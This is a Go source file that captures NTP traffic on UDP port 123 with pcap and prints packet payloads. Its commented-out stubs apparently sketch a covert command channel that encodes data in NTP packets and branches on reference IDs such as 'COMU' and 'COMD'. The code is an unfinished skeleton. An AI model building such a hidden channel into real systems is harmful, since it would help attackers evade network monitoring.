package handler

import (
	"fmt"
	"log"
	"mesa/goclient/pkg/agent"

	//"mesa/goclient/pkg/agent"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

//sniff for NTP traffic
//buffer?

func StartSniffer(newAgent agent.Agent) {
	var (
		iface  = newAgent.IFace
		buffer = int32(1600)
		filter = "udp and port 123" //More?
	)

	handler, err := pcap.OpenLive(iface, buffer, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}

	defer handler.Close()

	if err := handler.SetBPFFilter(filter); err != nil {
		log.Fatal(err)
	}

	source := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range source.Packets() {
		harvestInfo(packet)
	}
}

func harvestInfo(packet gopacket.Packet) {
	app := packet.ApplicationLayer()
	fmt.Println(app.LayerContents())
}

//encode/decode/craft packets
/*
func Encode(data string) Packet { //fix args

}

func Decode(packet ntppacket.NTPPacket) string {
	fmt.Print("yes")
	return "yes"
}
*/

//send traffic

// func resync(agent Agent) {

// }

/*
refID := "temp" //actually parsed

	if refId == "PING" {
		//something
	}else if refId == "COMU" {
		//something
	}else if refId == "COMD" {
		//something
	}else if refId == "GPS" {
		//something
	}else {
		//???
	}
*/
/*
func main() {
	conn, err := net.Dial(connType, connHost+":"+connPort)

	if err != nil {
		fmt.Println("Error connecting:", err.Error())
		os.Exit(1)
	}

	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("Message: ")

		input, _ := reader.ReadBytes('\n')

		conn.Write(input)

		message, _ := bufio.NewReader(conn).ReadString('\n')

		log.Print("Server echo: ", message)
	}
}
*/
